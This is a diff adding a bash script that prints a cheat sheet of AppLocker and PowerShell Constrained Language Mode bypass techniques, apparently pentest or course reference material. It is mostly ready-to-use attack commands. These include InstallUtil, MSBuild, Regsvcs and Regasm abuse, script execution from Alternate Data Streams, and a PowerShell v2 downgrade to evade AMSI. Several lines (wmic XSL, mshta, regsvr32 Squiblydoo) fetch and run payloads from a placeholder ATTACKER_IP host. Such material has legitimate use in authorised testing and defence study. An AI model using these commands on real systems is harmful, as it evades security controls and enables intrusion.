@@ -1,0 +1,78 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── APPLOCKER & CLM BYPASS ───────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Check AppLocker Status ───────────────────────────${NC}"
+echo -e "  ${GREEN}\$ExecutionContext.SessionState.LanguageMode${NC}    # Full = ok, Constrained = restricted"
+echo -e "  ${GREEN}Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections${NC}"
+echo -e "  ${GREEN}sc query AppIDSvc${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Writable Trusted Paths ───────────────────────────${NC}"
+echo -e "  ${GREEN}accesschk.exe 'student' C:\\Windows -wus${NC}       # find writable"
+echo -e "  Note: 'C:\\Windows\\Tasks\\'       often writable + trusted"
+echo -e "  Note: 'C:\\Windows\\Temp\\'"
+echo -e "  Note: 'C:\\Windows\\tracing\\'"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── InstallUtil Bypass ───────────────────────────────${NC}"
+echo -e "  ${GREEN}installutil.exe /logfile= /LogToConsole=false /U Bypass.exe${NC}"
+echo -e "  ${GREEN}C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U 'C:\\windows\\tasks\\b.exe'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Alternate Data Streams (ADS) ─────────────────────${NC}"
+echo -e "  ${GREEN}"'type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"'"${NC}"
+echo -e "  ${GREEN}"'wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"'"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── WMIC XSL ─────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}wmic process get brief /format:\"http://<ATTACKER_IP>/test.xsl\"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── MSHTA ────────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}mshta.exe http://<ATTACKER_IP>/test.hta${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── MSBuild ──────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe payload.xml${NC}"
+echo -e "  ${GREEN}C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe evil.csproj${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Regsvr32 Squiblydoo ──────────────────────────────${NC}"
+echo -e "  ${GREEN}regsvr32 /s /n /u /i:http://<ATTACKER_IP>/payload.sct scrobj.dll${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Regsvcs / Regasm ─────────────────────────────────${NC}"
+echo -e "  ${GREEN}C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe Bypass.dll${NC}"
+echo -e "  ${GREEN}C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U Bypass.dll${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── CLM Bypass — Custom Runspace (C#) ────────────────${NC}"
+echo -e "  Note: Compile as .exe, run from AppLocker-trusted path"
+echo -e "  ${GREEN}Runspace rs = RunspaceFactory.CreateRunspace();${NC}"
+echo -e "  ${GREEN}rs.Open(); PowerShell ps = PowerShell.Create(); ps.Runspace = rs;${NC}"
+echo -e "  ${GREEN}"'ps.AddScript("whoami; $ExecutionContext.SessionState.LanguageMode");'"${NC}"
+echo -e "  ${GREEN}foreach (PSObject r in ps.Invoke()) Console.WriteLine(r); rs.Close();${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PS Downgrade Attack ───────────────────────────────${NC}"
+echo -e "  ${GREEN}powershell -version 2 -exec bypass -c 'IEX ...'${NC}   # v2 has no AMSI/CLM"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AppLocker Exemptions (bypass by impersonating) ───${NC}"
+echo -e "  ${BLUE}NT AUTHORITY\\SYSTEM${NC}"
+echo -e "  ${BLUE}NT AUTHORITY\\NETWORK SERVICE${NC}"
+echo -e "  ${BLUE}IIS APPPOOL\\DefaultAppPool${NC}"
+echo -e "  ${BLUE}NT AUTHORITY\\LOCAL SERVICE${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
